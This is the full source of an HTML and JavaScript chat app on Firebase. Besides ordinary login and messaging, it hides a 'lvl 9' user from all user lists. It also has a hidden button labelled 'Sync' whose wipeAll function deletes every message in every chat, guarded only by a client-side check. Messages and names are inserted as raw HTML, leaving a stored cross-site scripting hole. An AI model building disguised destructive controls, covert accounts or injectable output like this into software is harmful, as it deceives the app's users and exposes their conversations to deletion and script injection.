<!DOCTYPE html>
<html>
<head>
<title>TalkZone Pro</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

<body style="font-family:sans-serif">

<h2>💬 TalkZone</h2>

<input id="user" placeholder="Username">
<input id="pass" type="password" placeholder="Password">
<button onclick="login()">Login</button>

<hr>

<h3>Users</h3>
<div id="users"></div>

<hr>

<h3 id="chatWith">Select user</h3>
<div id="chatBox" style="height:300px;overflow:auto;border:1px solid #ccc;"></div>

<input id="msg" placeholder="Type message">
<button onclick="sendMsg()">Send</button>

<br><br>

<button id="x9btn" onclick="wipeAll()" style="display:none">
⚙️ Sync
</button>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-app.js";
import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-auth.js";
import { getFirestore, collection, addDoc, onSnapshot, doc, setDoc, getDoc, getDocs, deleteDoc } from "https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyAKLZ4dHYp0ZFLolMB5XPxDUu-QPXB_MqA",
  authDomain: "talkzone-b3488.firebaseapp.com",
  projectId: "talkzone-b3488"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

let me = null;
let mode = 0;
let currentChat = null;

// LOGIN
window.login = async () => {

  let u = user.value.trim();
  let p = pass.value.trim();

  if(!u || !p){
    alert("Enter username & password");
    return;
  }

  let email = u + "@chat.com";

  try{
    let res = await signInWithEmailAndPassword(auth,email,p);
    me = res.user.uid;
  }catch{
    let res = await createUserWithEmailAndPassword(auth,email,p);
    me = res.user.uid;
  }

  // save user
  await setDoc(doc(db,"users",me),{
    name: u
  });

  // 🔐 hidden level check
  const snap = await getDoc(doc(db,"users",me));
  const data = snap.data();

  if(data.lvl === 9){
    mode = 9;
    document.getElementById("x9btn").style.display = "block";
    console.log("mode9");
  }

  loadUsers();
};

// LOAD USERS
function loadUsers(){

  onSnapshot(collection(db,"users"), snap=>{

    users.innerHTML = "";

    snap.forEach(d=>{

      const data = d.data();

      // 👻 hide special user
      if(data.lvl === 9) return;

      if(d.id === me) return;

      users.innerHTML += `
      <div onclick="openChat('${d.id}','${data.name}')"
      style="padding:6px;border-bottom:1px solid #ccc;cursor:pointer">
      ${data.name}
      </div>`;

    });

  });

}

// CHAT ID
function chatId(a,b){
  return a < b ? a+"_"+b : b+"_"+a;
}

// OPEN CHAT
window.openChat = (uid,name)=>{

  currentChat = chatId(me,uid);
  chatWith.innerText = "Chat with " + name;

  onSnapshot(collection(db,"chats",currentChat,"messages"), snap=>{

    chatBox.innerHTML = "";

    snap.forEach(d=>{

      const m = d.data();

      if(m.sender === me){
        chatBox.innerHTML += `<div style="text-align:right;color:green">You: ${m.text}</div>`;
      } else {
        chatBox.innerHTML += `<div style="color:blue">${name}: ${m.text}</div>`;
      }

    });

    chatBox.scrollTop = chatBox.scrollHeight;

  });

};

// SEND MESSAGE
window.sendMsg = async ()=>{

  if(!currentChat) return alert("Select user");

  let text = msg.value.trim();
  if(!text) return;

  await addDoc(collection(db,"chats",currentChat,"messages"),{
    sender: me,
    text: text,
    time: new Date()
  });

  msg.value = "";

};

// ⚙️ hidden control
window.wipeAll = async ()=>{

  if(mode !== 9) return;

  const chats = await getDocs(collection(db,"chats"));

  chats.forEach(async c=>{
    const msgs = await getDocs(collection(db,"chats",c.id,"messages"));
    msgs.forEach(m=>deleteDoc(m.ref));
  });

  alert("done");

};

</script>

</body>
</html>
